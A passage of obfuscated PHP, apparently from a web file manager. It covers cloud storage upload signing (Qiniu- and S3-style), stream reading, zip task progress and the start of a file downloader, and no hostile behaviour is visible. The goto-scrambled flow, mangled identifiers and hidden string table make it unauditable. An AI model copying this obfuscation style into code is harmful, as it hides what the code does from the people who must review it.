$aæÇÔ‘); return $CåŸ…ÒÄÉ ? !1 : $this->getPathOuter($e±Ö³ Õ¶); } public function uploadFormData($dµ±µ¾˜Ä, $cåÓÌ¬ = 3600) { return $this->uploadToken($dµ±µ¾˜Ä, $cåÓÌ¬); } public function multiUploadFormData($eÊĞŒñºÇ•, $dØÈšÔñˆ” = 3600) { return $this->uploadToken($eÊĞŒñºÇ•, $dØÈšÔñˆ”); } private function uploadToken($dÆØšÊ‹Ô, $A•İ§”¼Ñ = 3600) { goto DÌ›ô‡ù¢¥; DÌ›ô‡ù¢¥: $Càœ¡¬•‘À =& $_SERVER[‡’¶øåüç˜]; $cšÍ„îÜÚ™ = $A•İ§”¼Ñ; $D°ÇáÉØ¶ = array($Càœ¡¬•‘À[1227] => $Càœ¡¬•‘À[1228]); goto CôÄßå¯·‰; a¨®˜¯Å•: $CººÅï¡Ê = http_type() . "\x3a\57\x2f\x75\160\154\x6f\141\144{$F…³­´‡ì}\56\161\151\x6e\x69\x75\160\56\x63\x6f\x6d\57"; return array($Càœ¡¬•‘À[1230] => $cò†‚¤ÑØŞ, $Càœ¡¬•‘À[1231] => $CººÅï¡Ê); goto C‡®Ó½Ú; CôÄßå¯·‰: $dÛº–Ë‘„õ = $dÆØšÊ‹Ô; $cò†‚¤ÑØŞ = $this->auth->uploadToken($this->bucket, $dÛº–Ë‘„õ, $cšÍ„îÜÚ™, $D°ÇáÉØ¶, !0); $F…³­´‡ì = empty($this->region) || $this->region == $Càœ¡¬•‘À[1229] ? $Càœ¡¬•‘À[33] : $Càœ¡¬•‘À[424] . $this->region; goto a¨®˜¯Å•; C‡®Ó½Ú: } public function download($bÙÒ´‘ŒÙŒ, $Eâìç„ÕÜÆ) { goto D‰ŒâÅàçÄ; CİõÖ±àî‡: $f¨ØïÅƒÖÁ = 1024 * 200; $d¾ä¨‰ùª = fopen($Fğ¶‰­Ûñ, $_SERVER[‡’¶øåüç˜][1232]); while (!0) { $Dä’ñê¯ƒ» = $this->fileSubstr($bÙÒ´‘ŒÙŒ, $dÏç¢¦œçç, $f¨ØïÅƒÖÁ); if ($Dä’ñê¯ƒ» === !1) { return !1; } fwrite($d¾ä¨‰ùª, $Dä’ñê¯ƒ»); $dÏç¢¦œçç += $f¨ØïÅƒÖÁ; if (strlen($Dä’ñê¯ƒ») < $f¨ØïÅƒÖÁ) { break; } } goto d…×º¡¥É; d…×º¡¥É: fclose($d¾ä¨‰ùª); return $Eâìç„ÕÜÆ; goto c©‡³Ÿø…; D‰ŒâÅàçÄ: $Fğ¶‰­Ûñ = IO::getPathInner(IO::mkfile($Eâìç„ÕÜÆ)); if (!($C§”º®Î = $this->link($bÙÒ´‘ŒÙŒ))) { return !1; } $dÏç¢¦œçç = 0; goto CİõÖ±àî‡; c©‡³Ÿø…: } public function link($A½êèÙÌ, $c³‘êÁŠ›× = '') { if (!$this->isFile($A½êèÙÌ)) { return !1; } $B‡£‘­èä = $this->getHost() . $_SERVER[‡’¶øåüç˜][8] . $this->pathEncode($A½êèÙÌ) . $c³‘êÁŠ›×; return $this->auth->privateDownloadUrl($B‡£‘­èä, 3600 * 12); } public function fileOut($d„ê îæŞ„, $CÔ İ”æ’ˆ = false, $aƒ²œôå„ = false, $B÷»Éƒâ£Í = '') { $DƒîªÄ±Ñ =& $_SERVER[‡’¶øåüç˜]; if ($this->isFileOutServer()) { return $this->fileOutServer($d„ê îæŞ„, $CÔ İ”æ’ˆ, $aƒ²œôå„, $B÷»Éƒâ£Í); } if (!$aƒ²œôå„) { $aƒ²œôå„ = $this->pathThis($d„ê îæŞ„); } $dºÁ Óœ’‡ = $CÔ İ”æ’ˆ ? $DƒîªÄ±Ñ[1233] . rawurlencode($aƒ²œôå„) : $DƒîªÄ±Ñ[33]; $DÄ—ÜëøÎ = $this->link($d„ê îæŞ„, $dºÁ Óœ’‡); $this->fileOutLink($DÄ—ÜëøÎ); } public function fileOutServer($A¸ç¸å»¹, $aÙÅ©İĞé´ = false, $e¢“ëõ¶ó÷ = false, $a¦…Á„óİ¬ = '') { parent::fileOut($A¸ç¸å»¹, $aÙÅ©İĞé´, $e¢“ëõ¶ó÷, $a¦…Á„óİ¬); } public function fileOutImage($aÛ°ö°Í ‰, $e¨æíŸˆÓÄ = 250) { $C³¹ÊÖ¾¯ = $this->link($aÛ°ö°Í ‰, $_SERVER[‡’¶øåüç˜][1234] . $e¨æíŸˆÓÄ); $this->fileOutLink($C³¹ÊÖ¾¯); } public function fileOutImageServer($d„Í„’®Ê, $CĞ·È¼Îˆ = 250) { parent::fileOutImage($d„Í„’®Ê, $CĞ·È¼Îˆ); } public function hashMd5($d›ˆ÷‡ãÆ) { $A‘ĞÅ¨Û˜ê =& $_SERVER[‡’¶øåüç˜]; $Dä‹„Ù‰ÑÀ = $this->objectMeta($d›ˆ÷‡ãÆ); return isset($Dä‹„Ù‰ÑÀ[$A‘ĞÅ¨Û˜ê[200]]) ? $Dä‹„Ù‰ÑÀ[$A‘ĞÅ¨Û˜ê[200]] : !1; $eä£¨ÚÅŞ› = $this->link($d›ˆ÷‡ãÆ, $A‘ĞÅ¨Û˜ê[1235]); } public function size($e³µÄ´›ÇÕ) { $AÂö©¾º°õ = $this->objectMeta($e³µÄ´›ÇÕ); return $AÂö©¾º°õ ? $AÂö©¾º°õ[$_SERVER[‡’¶øåüç˜][77]] : 0; } public function info($CÛµˆãîåè) { if ($this->isFolder($CÛµˆãîåè)) { return $this->folderInfo($CÛµˆãîåè); } else { if ($this->isFile($CÛµˆãîåè)) { return $this->fileInfo($CÛµˆãîåè); } } return !1; } public function exist($Aéƒãõè‹‡) { return $this->isFile($Aéƒãõè‹‡) || $this->isFolder($Aéƒãõè‹‡); } public function isFile($A¶Çë¤ëå) { return !$this->isFolder($A¶Çë¤ëå) && $this->objectMeta($A¶Çë¤ëå); } public function isFolder($c†ïÑŠƒË°) { return $this->cacheMethod($_SERVER[‡’¶øåüç˜][227], $c†ïÑŠƒË°); } protected function objectMeta($d‘÷õíÀí‡) { return $this->cacheMethod($_SERVER[‡’¶øåüç˜][228], $d‘÷õíÀí‡); } protected function _objectMeta($Bš†™·Ÿá) { $FĞİÕ…ŒÏÛ =& $_SERVER[‡’¶øåüç˜]; list($c„ˆ…ëÎä—, $b ²ÕÑÅ‘) = $this->bucketManager->stat($this->bucket, $Bš†™·Ÿá); if ($c„ˆ…ëÎä—) { $c„ˆ…ëÎä—[$FĞİÕ…ŒÏÛ[77]] = intval($c„ˆ…ëÎä—[$FĞİÕ…ŒÏÛ[1222]]); } return $c„ˆ…ëÎä—; } protected function _isFolder($déÒÏÚ¾äî) { $eÚ²‡çİÊØ =& $_SERVER[‡’¶øåüç˜]; if ($déÒÏÚ¾äî == $eÚ²‡çİÊØ[33] || $déÒÏÚ¾äî == $eÚ²‡çİÊØ[8]) { return !0; } list($D÷¥™º¥¥¸, $cùòŠ‹ìì) = $this->bucketManager->listFiles($this->bucket, trim($déÒÏÚ¾äî, $eÚ²‡çİÊØ[8]) . $eÚ²‡çİÊØ[8], $eÚ²‡çİÊØ[33], 1, $eÚ²‡çİÊØ[8]); return !empty($D÷¥™º¥¥¸[$eÚ²‡çİÊØ[1221]]) || !empty($D÷¥™º¥¥¸[$eÚ²‡çİÊØ[1224]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($D¦í¦¡èÅî) { parent::__construct($D¦í¦¡èÅî); } public function uploadFormData($fõäŠ¼ƒ×¶, $dùÍÌÜİ­£ = 3600) { goto D–öì£¾Ã„; B‰š­•ŠÒ: $eàØ×óğ» = $fùê¡ºˆ[1143]; $fÜ›”Ãíˆ = $dùÍÌÜİ­£ . $fùê¡ºˆ[33]; $CÓ‚ª·ö„ = $fùê¡ºˆ[1107]; goto F®‚ä°Æé; F®‚ä°Æé: $c¨±ËÏÛ˜ = array($this->accessKey, $BãªÂƒö’„, $this->region, $Fµ÷ ‹¬œÛ, $eàØ×óğ»); $B™îÊ„Şğ = implode($fùê¡ºˆ[8], $c¨±ËÏÛ˜); $C•š‰Úâ¹ = array($fùê¡ºˆ[1109] => gmdate($fùê¡ºˆ[1108], strtotime($fùê¡ºˆ[1144])), $fùê¡ºˆ[1110] => array(array($fùê¡ºˆ[1112] => $this->bucket), array($fùê¡ºˆ[1111] => $aŒ½’õë¿ß), array($fùê¡ºˆ[1113], $fùê¡ºˆ[1114], $fùê¡ºˆ[33]), array($fùê¡ºˆ[1113], $fùê¡ºˆ[1145], $fùê¡ºˆ[33]), array($fùê¡ºˆ[1113], $fùê¡ºˆ[1146], $fùê¡ºˆ[33]), array($fùê¡ºˆ[1115] => $CÓ‚ª·ö„), array($fùê¡ºˆ[1147] => $B™îÊ„Şğ), array($fùê¡ºˆ[1148] => $Câ÷ä’’İÓ), array($fùê¡ºˆ[1149] => $eåö­“Ñ½‚), array($fùê¡ºˆ[1150] => $fÜ›”Ãíˆ))); goto bªÂˆéë‡¶; a˜õ­Ê”Ğ™: $e›¥ˆŒÀˆí = hash_hmac($fùê¡ºˆ[1151], $Fµ÷ ‹¬œÛ, $bŒˆ‚¢¸âß, !0); $dâèÕ†‹Âœ = hash_hmac($fùê¡ºˆ[1151], $eàØ×óğ», $e›¥ˆŒÀˆí, !0); $D’ìÃä‡¾ß = hash_hmac($fùê¡ºˆ[1151], $aƒˆç»‘±É, $dâèÕ†‹Âœ); goto Eš§ØòóÖ®; D–öì£¾Ã„: $fùê¡ºˆ =& $_SERVER[‡’¶øåüç˜]; $aŒ½’õë¿ß = $fùê¡ºˆ[189]; $Câ÷ä’’İÓ = $fùê¡ºˆ[1141]; goto F°Ó—ÒÈ°; bªÂˆéë‡¶: $aƒˆç»‘±É = base64_encode(json_encode($C•š‰Úâ¹)); $dİ±˜Îò©­ = hash_hmac($fùê¡ºˆ[1151], $BãªÂƒö’„, $fùê¡ºˆ[1152] . $this->secret, !0); $bŒˆ‚¢¸âß = hash_hmac($fùê¡ºˆ[1151], $this->region, $dİ±˜Îò©­, !0); goto a˜õ­Ê”Ğ™; F°Ó—ÒÈ°: $Fµ÷ ‹¬œÛ = $fùê¡ºˆ[59]; $eåö­“Ñ½‚ = gmdate($fùê¡ºˆ[1142]); $BãªÂƒö’„ = gmdate($fùê¡ºˆ[696]); goto B‰š­•ŠÒ; Eš§ØòóÖ®: $AÀººÎœ» = array($fùê¡ºˆ[203] => $fùê¡ºˆ[33], $fùê¡ºˆ[1153] => $fùê¡ºˆ[33], $fùê¡ºˆ[1111] => $aŒ½’õë¿ß, $fùê¡ºˆ[1115] => $CÓ‚ª·ö„, $fùê¡ºˆ[1119] => $aƒˆç»‘±É, $fùê¡ºˆ[1154] => $B™îÊ„Şğ, $fùê¡ºˆ[1155] => $Câ÷ä’’İÓ, $fùê¡ºˆ[1156] => $eåö­“Ñ½‚, $fùê¡ºˆ[1157] => $fÜ›”Ãíˆ, $fùê¡ºˆ[1158] => $D’ìÃä‡¾ß, $fùê¡ºˆ[173] => $this->getHost()); return $AÀººÎœ»; goto eù³ÅñïîŒ; eù³ÅñïîŒ: } public function multiUploadFormData($CôÆ½ ö‚¦, $d®’ãšÊ‡° = 3600) { $cÚÇ¼ì»Œ‘ =& $_SERVER[‡’¶øåüç˜]; $D³¡³¡âö = gmdate($cÚÇ¼ì»Œ‘[1236]); $fóÓÙƒÖ®œ = array(); $EåæâÖÊ›Å = $this->client->getUploadId($this->bucket, $CôÆ½ ö‚¦, $fóÓÙƒÖ®œ); if (!$EåæâÖÊ›Å) { return !1; } return array($cÚÇ¼ì»Œ‘[213] => $EåæâÖÊ›Å, $cÚÇ¼ì»Œ‘[173] => $this->getHost() . $cÚÇ¼ì»Œ‘[8] . $this->pathEncode($CôÆ½ ö‚¦), $cÚÇ¼ì»Œ‘[214] => $D³¡³¡âö, $cÚÇ¼ì»Œ‘[89] => $CôÆ½ ö‚¦); } public function multiUploadAuthData($aÒçøßÎÇ, $B•¨ªÉğ = array()) { goto dÎ‰¦£‹©é; aï½í×â–®: if (isset($B•¨ªÉğ[$dèºÌº«[1237]])) { $C·…†«¯É¸[$dèºÌº«[1238]] = $B•¨ªÉğ[$dèºÌº«[1237]]; } $CŒ¨–ÇŸ÷ƒ = explode($dèºÌº«[175], $this->getHost()); $eÆ‹¡¾‚­— = array($dèºÌº«[1239] => $CŒ¨–ÇŸ÷ƒ[1], $dèºÌº«[1240] => $dèºÌº«[33], $dèºÌº«[203] => $dèºÌº«[116], $dèºÌº«[1153] => $B•¨ªÉğ[$dèºÌº«[77]]); goto fŸ„ï‹öá²; f›Ãù¢ã•: if (strpos($b®ˆÀã‘°, $dèºÌº«[217]) === 0) { if (isset($C·…†«¯É¸[$dèºÌº«[1238]])) { $B¬ô—´¥Œî = $C·…†«¯É¸[$dèºÌº«[1238]]; } else { if (isset($DŠ‰Ë›«½[$dèºÌº«[1238]])) { $B¬ô—´¥Œî = $DŠ‰Ë›«½[$dèºÌº«[1238]]; } else { $B¬ô—´¥Œî = hash($dèºÌº«[1151], $dèºÌº«[33]); } } return array($dèºÌº«[224] => $DŠ‰Ë›«½[$dèºÌº«[224]], $dèºÌº«[1238] => $B¬ô—´¥Œî, $dèºÌº«[214] => $DŠ‰Ë›«½[$dèºÌº«[1241]]); } return $DŠ‰Ë›«½[$dèºÌº«[224]]; goto D£À™¥“Ú; C–œïÓÍ³: unset($B•¨ªÉğ[$dèºÌº«[89]]); if (isset($B•¨ªÉğ[$dèºÌº«[215]])) { return $this->listUploadParts($b†´›²²ç, $B•¨ªÉğ); } $C·…†«¯É¸ = array(); goto aï½í×â–®; fŸ„ï‹öá²: $E²«¾˜©àß = $dèºÌº«[218]; $FåÃß—–ŒÓ = $dèºÌº«[8] . $this->pathEncode($b†´›²²ç) . $b®ˆÀã‘°; $DŠ‰Ë›«½ = $this->client->__getSignatureV4($C·…†«¯É¸, $eÆ‹¡¾‚­—, $E²«¾˜©àß, $FåÃß—–ŒÓ); goto f›Ãù¢ã•; dÎ‰¦£‹©é: $dèºÌº« =& $_SERVER[‡’¶øåüç˜]; $b®ˆÀã‘° = isset($B•¨ªÉğ[$dèºÌº«[165]]) ? $B•¨ªÉğ[$dèºÌº«[165]] : $dèºÌº«[33]; $b†´›²²ç = $B•¨ªÉğ[$dèºÌº«[89]]; goto C–œïÓÍ³; D£À™¥“Ú: } public function listUploadParts($BÔà¹Š¡¢, $B±‘ÑƒÃ÷š = array()) { goto bò¸Æç±ïÜ; a—õ¿˜ºÆÉ: $A·Ó†µ”÷ = array($fäâ—»àñÍ[1239] => $f©²¹Òèí[1], $fäâ—»àñÍ[203] => $fäâ—»àñÍ[116], $fäâ—»àñÍ[1153] => strlen($e§ÌÌ¿ÑÏÍ)); $F•²‹ˆØØ• = $fäâ—»àñÍ[216]; $Aœíñ‘Ñ–â = $fäâ—»àñÍ[8] . $this->pathEncode($BÔà¹Š¡¢) . $B±‘ÑƒÃ÷š[$fäâ—»àñÍ[165]]; goto bÜ¨¾‡÷‘Ä; bÜ¨¾‡÷‘Ä: $fÒ·ØÄèÊÊ = $this->client->__getSignatureV4($cĞç°èãÒ†, $A·Ó†µ”÷, $F•²‹ˆØØ•, $Aœíñ‘Ñ–â, $e§ÌÌ¿ÑÏÍ); return array($fäâ—»àñÍ[224] => $fÒ·ØÄèÊÊ[$fäâ—»àñÍ[224]], $fäâ—»àñÍ[214] => $fÒ·ØÄèÊÊ[$fäâ—»àñÍ[1241]], $fäâ—»àñÍ[226] => $b‰‡“¸«Ÿ½, $fäâ—»àñÍ[1238] => $fÒ·ØÄèÊÊ[$fäâ—»àñÍ[1238]]); goto BŞ­ÅÕÏ¨; DÌ¼«ÌæÀÁ: if (!$b‰‡“¸«Ÿ½) { return !1; } $e§ÌÌ¿ÑÏÍ = $fäâ—»àñÍ[1242]; foreach ($b‰‡“¸«Ÿ½ as $d´…Ç›ÆÚ‰) { $e§ÌÌ¿ÑÏÍ .= $fäâ—»àñÍ[1243] . "\x3c\x50\141\162\164\x4e\165\155\x62\x65\x72\76{$d´…Ç›ÆÚ‰[$fäâ—»àñÍ[1195]]}\x3c\57\120\141\x72\164\x4e\165\x6d\x62\145\162\x3e\xa" . "\74\x45\x54\141\x67\x3e{$d´…Ç›ÆÚ‰[$fäâ—»àñÍ[1196]]}\74\x2f\105\124\141\x67\x3e\12" . $fäâ—»àñÍ[1244]; } goto e…é†ˆê†Ñ; bò¸Æç±ïÜ: $fäâ—»àñÍ =& $_SERVER[‡’¶øåüç˜]; $b…©‘ËÏí½ = str_replace($fäâ—»àñÍ[225], $fäâ—»àñÍ[33], $B±‘ÑƒÃ÷š[$fäâ—»àñÍ[165]]); $b‰‡“¸«Ÿ½ = $this->client->listParts($this->bucket, $BÔà¹Š¡¢, $b…©‘ËÏí½); goto DÌ¼«ÌæÀÁ; e…é†ˆê†Ñ: $e§ÌÌ¿ÑÏÍ .= $fäâ—»àñÍ[1245]; $cĞç°èãÒ† = array(); $f©²¹Òèí = explode($fäâ—»àñÍ[175], $this->getHost()); goto a—õ¿˜ºÆÉ; BŞ­ÅÕÏ¨: } public function link($d†´ÈÀ , $B™–…í«ÒÈ = array()) { return parent::link($d†´ÈÀ , $B™–…í«ÒÈ); } public function fileOut($fæ…µãÜ­×, $A©ğßå†ß = false, $b±­Ø„´îÛ = false, $cŸœõä‹° = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[‡’¶øåüç˜][1246])) { return parent::fileOutServer($fæ…µãÜ­×, $A©ğßå†ß, $b±­Ø„´îÛ, $cŸœõä‹°); } parent::fileOut($fæ…µãÜ­×, $A©ğßå†ß, $b±­Ø„´îÛ, $cŸœõä‹°); } public function fileOutImage($dÈéµáÜÅğ, $EáõµõÚê» = 250) { if (strstr($this->endpoint, $_SERVER[‡’¶øåüç˜][1246])) { return parent::fileOutImageServer($dÈéµáÜÅğ, $EáõµõÚê»); } parent::fileOutImage($dÈéµáÜÅğ, $EáõµõÚê»); } public function fileOutLink($c„÷×¼) { $Dç–ËØ†¦ˆ =& $_SERVER[‡’¶øåüç˜]; if (substr($c„÷×¼, 0, 7) == $Dç–ËØ†¦ˆ[1122]) { $c„÷×¼ = $Dç–ËØ†¦ˆ[1123] . substr($c„÷×¼, 7); } header($Dç–ËØ†¦ˆ[156] . $c„÷×¼); die; } public function getHost() { $E¥×ÖùÛƒÛ =& $_SERVER[‡’¶øåüç˜]; $E¥Â»¬œî = str_rtrim(parent::getHost(), $E¥×ÖùÛƒÛ[8] . $this->bucket); $E¥Â»¬œî = explode($E¥×ÖùÛƒÛ[175], $E¥Â»¬œî); return $E¥Â»¬œî[0] . $E¥×ÖùÛƒÛ[175] . $this->bucket . $E¥×ÖùÛƒÛ[91] . $E¥Â»¬œî[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($eï”Ç›öÔ, $dŞ‰±ø‡à… = 0) { parent::__construct(); $this->source = $eï”Ç›öÔ; $this->sourceSize = $dŞ‰±ø‡à…; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($a‰‰ŠÂÙ = false) { return $this->sourceSize; } public function getContent($a„‰·«¤´‰ = false) { return $this->fileSubstr($a„‰·«¤´‰, 0, $this->sourceSize); } public function fileSubstr($F‘¶°Æ…‘š = false, $D©ùÍ«¹‡ = 0, $BÏºŸ‡îğä = 0) { if (!$BÏºŸ‡îğä) { $BÏºŸ‡îğä = $this->sourceSize; } $DŠ–ŠÔ‚•ğ = $this->sourceSize - $D©ùÍ«¹‡; if ($BÏºŸ‡îğä >= $DŠ–ŠÔ‚•ğ) { $BÏºŸ‡îğä = $DŠ–ŠÔ‚•ğ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $D©ùÍ«¹‡, $BÏºŸ‡îğä); } if ($this->sourceType == self::TYPE_FILE) { if ($BÏºŸ‡îğä <= 0) { return $_SERVER[‡’¶øåüç˜][33]; } $a¶—×­§À = ftell($this->source); fseek_64($this->source, $a¶—×­§À + $D©ùÍ«¹‡); $fæäø¼Ø¦¤ = @fread($this->source, $BÏºŸ‡îğä); fseek_64($this->source, $a¶—×­§À); return $fæäø¼Ø¦¤; } } public function hashMd5($BÛç‰™‚ß‚ = false) { return md5($this->getContent()); } public static function hash($CÇƒã²ˆ¯, $aØğ‚‡ÒÒì = 0) { $cŸ¡Ù‰©Ÿ = new PathDriverStream($CÇƒã²ˆ¯, $aØğ‚‡ÒÒì); return $cŸ¡Ù‰©Ÿ->hashSimple($CÇƒã²ˆ¯); } public static function md5($Bµ¹Ğ„®³‚, $DÚ¼ö›“ª¢ = 0) { $E¦æ³®´  = new PathDriverStream($Bµ¹Ğ„®³‚, $DÚ¼ö›“ª¢); return $E¦æ³®´ ->hashMd5($Bµ¹Ğ„®³‚); } } goto d“Öí¹¥Üğ; FêÔµ—’¦‡: class TaskZip extends TaskFileTransfer { protected function startAfter() { $BÌÚ¯îÇòø =& $_SERVER[‡’¶øåüç˜]; parent::startAfter(); Hook::bind($BÌÚ¯îÇòø[1519], array($this, $BÌÚ¯îÇòø[1514])); $D°‘Ø—Šî˜ =& $this->task; $D°‘Ø—Šî˜[$BÌÚ¯îÇòø[1516]] = $BÌÚ¯îÇòø[1048]; if (!$D°‘Ø—Šî˜[$BÌÚ¯îÇòø[1348]]) { $D°‘Ø—Šî˜[$BÌÚ¯îÇòø[1348]] = LNG($BÌÚ¯îÇòø[1520]); } } protected function endAfter() { $a˜Ò¸¯´¸¥ =& $_SERVER[‡’¶øåüç˜]; parent::endAfter(); Hook::unbind($a˜Ò¸¯´¸¥[1519], array($this, $a˜Ò¸¯´¸¥[1514])); } public function updateAfter() { $b”¤ò‡ô¿à =& $_SERVER[‡’¶øåüç˜]; $CË‹ò³áºŸ =& $this->task; if (!$CË‹ò³áºŸ[$b”¤ò‡ô¿à[980]] || !$CË‹ò³áºŸ[$b”¤ò‡ô¿à[704]]) { return; } if ($CË‹ò³áºŸ[$b”¤ò‡ô¿à[1516]] == $b”¤ò‡ô¿à[1048]) { $aó¼ŒÊçŸ® = $CË‹ò³áºŸ[$b”¤ò‡ô¿à[1489]]; if ($CË‹ò³áºŸ[$b”¤ò‡ô¿à[1490]] != $b”¤ò‡ô¿à[1048]) { $aó¼ŒÊçŸ® = 0; } $a™©…––¢¤ = ($CË‹ò³áºŸ[$b”¤ò‡ô¿à[1493]] + $aó¼ŒÊçŸ®) / $CË‹ò³áºŸ[$b”¤ò‡ô¿à[704]]; $CË‹ò³áºŸ[$b”¤ò‡ô¿à[1444]] = $a™©…––¢¤ * 0.3; } else { if ($CË‹ò³áºŸ[$b”¤ò‡ô¿à[1516]] == $b”¤ò‡ô¿à[305]) { $a™©…––¢¤ = $CË‹ò³áºŸ[$b”¤ò‡ô¿à[994]] / $CË‹ò³áºŸ[$b”¤ò‡ô¿à[980]]; $CË‹ò³áºŸ[$b”¤ò‡ô¿à[1444]] = 0.3 + $a™©…––¢¤ * 0.5; } else { if ($CË‹ò³áºŸ[$b”¤ò‡ô¿à[1516]] == $b”¤ò‡ô¿à[103]) { $a™©…––¢¤ = 0; if ($CË‹ò³áºŸ[$b”¤ò‡ô¿à[1488]]) { $a™©…––¢¤ = $CË‹ò³áºŸ[$b”¤ò‡ô¿à[1489]] / $CË‹ò³áºŸ[$b”¤ò‡ô¿à[1488]]; } $CË‹ò³áºŸ[$b”¤ò‡ô¿à[1444]] = 0.3 + 0.5 + $a™©…––¢¤ * 0.2; } } } if ($CË‹ò³áºŸ[$b”¤ò‡ô¿à[1444]] > 0) { $Dß—Åœ¬—° = timeFloat() - $CË‹ò³áºŸ[$b”¤ò‡ô¿à[1446]] - $CË‹ò³áºŸ[$b”¤ò‡ô¿à[1449]]; $CË‹ò³áºŸ[$b”¤ò‡ô¿à[1450]] = $Dß—Åœ¬—° * (1 - $CË‹ò³áºŸ[$b”¤ò‡ô¿à[1444]]) / $CË‹ò³áºŸ[$b”¤ò‡ô¿à[1444]]; } } public function copyFileStart($eï ¯áÎ®, $bô˜µ‡², $aÅ£“ñè§, $F¯ì‡¿ÏğÓ, $dÙ‹ˆñÃê, $aö‡²á›‹Ü) { $B®×¢¹‚ãª =& $_SERVER[‡’¶øåüç˜]; parent::copyFileStart($eï ¯áÎ®, $bô˜µ‡², $aÅ£“ñè§, $F¯ì‡¿ÏğÓ, $dÙ‹ˆñÃê, $aö‡²á›‹Ü); $cë”²¡âì =& $this->task; if ($cë”²¡âì[$B®×¢¹‚ãª[1516]] == $B®×¢¹‚ãª[305]) { $cë”²¡âì[$B®×¢¹‚ãª[1516]] = $B®×¢¹‚ãª[103]; } $this->update(); } public function copyFileEnd($aãÁà¹ôÄ, $a³æ¨ƒ±, $EÅñÛ½¨”â, $eºª‰¦Ú»¢, $A§öÎŠøñœ, $d²Šöòæğ) { $cØè¯¨ù‘Â =& $_SERVER[‡’¶øåüç˜]; $FÓæÑ©•Ä =& $this->task; $FÓæÑ©•Ä[$cØè¯¨ù‘Â[1489]] = $FÓæÑ©•Ä[$cØè¯¨ù‘Â[1488]]; $FÓæÑ©•Ä[$cØè¯¨ù‘Â[1493]] += $FÓæÑ©•Ä[$cØè¯¨ù‘Â[1488]]; $FÓæÑ©•Ä[$cØè¯¨ù‘Â[1490]] = $cØè¯¨ù‘Â[33]; $this->update(); } public function nameParse($eªË›ç¾†) { $c—‘Î­³£Œ =& $_SERVER[‡’¶øåüç˜]; $b–»ÀÛÉÉ =& $this->task; if ($b–»ÀÛÉÉ[$c—‘Î­³£Œ[994]] < $b–»ÀÛÉÉ[$c—‘Î­³£Œ[980]]) { $Cö£øöùÎ = get_path_this($eªË›ç¾†); if (strstr($Cö£øöùÎ, $c—‘Î­³£Œ[91])) { $b–»ÀÛÉÉ[$c—‘Î­³£Œ[994]] += 1; } } if ($b–»ÀÛÉÉ[$c—‘Î­³£Œ[1516]] == $c—‘Î­³£Œ[1048]) { $b–»ÀÛÉÉ[$c—‘Î­³£Œ[1516]] = $c—‘Î­³£Œ[305]; } $b–»ÀÛÉÉ[$c—‘Î­³£Œ[1486]] = $eªË›ç¾†; $this->update(); } } class Downloader { static function start($EÙßáÂÀø‘, $aÜ†ĞˆÄˆ“, $Dª­’Œ¯ê = 10) { goto d–äñ¾ÖÄî; eŸŞ¸¤ßª¾: $dÂÆéŞŠ‡® = intval($fİôìæÃâ¶[$c“¶îÁÊÕö[329]]); if (file_exists($BâÀä•†ğ) && time() - filemtime($BâÀä•†ğ) < 3) { return array($c“¶îÁÊÕö[1040] => !1, $c“¶îÁÊÕö[1042] => $c“¶îÁÊÕö[1523]); } $E›Öã™íõ = array(); goto bÕ·Ğ‹ŸÙö; aèùƒ‘†·—: if (!$EÙßáÂÀø‘) { return array($c“¶îÁÊÕö[1040] => !1, $c“¶îÁÊÕö[1042] => $c“¶îÁÊÕö[1045]); } if (!$fİôìæÃâ¶[$c“¶îÁÊÕö[1294]] || $fİôìæÃâ¶[$c“¶îÁÊÕö[329]] == 0) { @unlink($BâÀä•†ğ); @unlink($aÜ†ĞˆÄˆ“); $d²Ğ‰‘‰—Ø = self::fileDownloadFopen($EÙßáÂÀø‘, $aÜ†ĞˆÄˆ“, $fİôìæÃâ¶[$c“¶îÁÊÕö[329]]); if ($d²Ğ‰‘‰—Ø[$c“¶îÁÊÕö[1040]]) { return $d²Ğ‰‘‰—Ø; } else { @unlink($BâÀä•†ğ); @unlink($aÜ†ĞˆÄˆ“); $d²Ğ‰‘‰—Ø = self::fileDownloadCurl($EÙßáÂÀø‘, $aÜ†ĞˆÄˆ“, !1, 0, $fİôìæÃâ¶[$c“¶îÁÊÕö[329]]); @unlink($BâÀä•†ğ); return $d²Ğ‰‘‰—Ø; } } $e¤Û¡ä…¼† = is_file($BâÀä•†ğ) ? filesize_64($BâÀä•†ğ) : 0; goto eŸŞ¸¤ßª¾; dºß¸•‰Ù: if ($d²Ğ‰‘‰—Ø[$c“¶îÁÊÕö[1040]]) { @unlink($Eó¼Œ È„ˆ); } return $d²Ğ‰‘‰—Ø; goto DÖ²öÚ·—ö; b³´Ú©´‹Ú: if ($e¤Û¡ä…¼† > $dÂÆéŞŠ‡®) { @unlink($BâÀä•†ğ); } file_put_contents($Eó¼Œ È„ˆ, json_encode($E›Öã™íõ)); $d²Ğ‰‘‰—Ø = self::fileDownloadCurl($EÙßáÂÀø‘, $aÜ†ĞˆÄˆ“, !0, $e¤Û¡ä…¼†, $dÂÆéŞŠ‡®); goto dºß¸•‰Ù; B«ÏáòÂ„: $BâÀä•†ğ = $aÜ†ĞˆÄˆ“ . $c“¶îÁÊÕö[1522]; if (is_array($EÙßáÂÀø‘)) { $fİôìæÃâ¶ = $EÙßáÂÀø‘; } else { $fİôìæÃâ¶ = url_header($EÙßáÂÀø‘); } $EÙßáÂÀø‘ = $fİôìæÃâ¶[$c“¶îÁÊÕö[299]]; goto aèùƒ‘†·—; d–äñ¾ÖÄî: $c“¶îÁÊÕö =& $_SERVER[‡’¶øåüç˜]; if (!request_url_safe($EÙßáÂÀø‘)) { return array($c“¶îÁÊÕö[1040] => !1, $c“¶îÁÊÕö[1042] => $c“¶îÁÊÕö[1045]); } $Eó¼Œ È„ˆ = $aÜ†ĞˆÄˆ“ . $c“¶îÁÊÕö[1521]; goto B«ÏáòÂ„; bÕ·Ğ‹ŸÙö: if (is_file($Eó¼Œ È„ˆ)) { $E‚¤è¥Œ‹ = file_get_contents($Eó¼Œ È„ˆ); $E›Öã™íõ = json_decode($E‚¤è¥Œ‹, 1); } if (file_exists($aÜ†ĞˆÄˆ“) && $dÂÆéŞŠ‡® == filesize_64($aÜ†ĞˆÄˆ“)) { 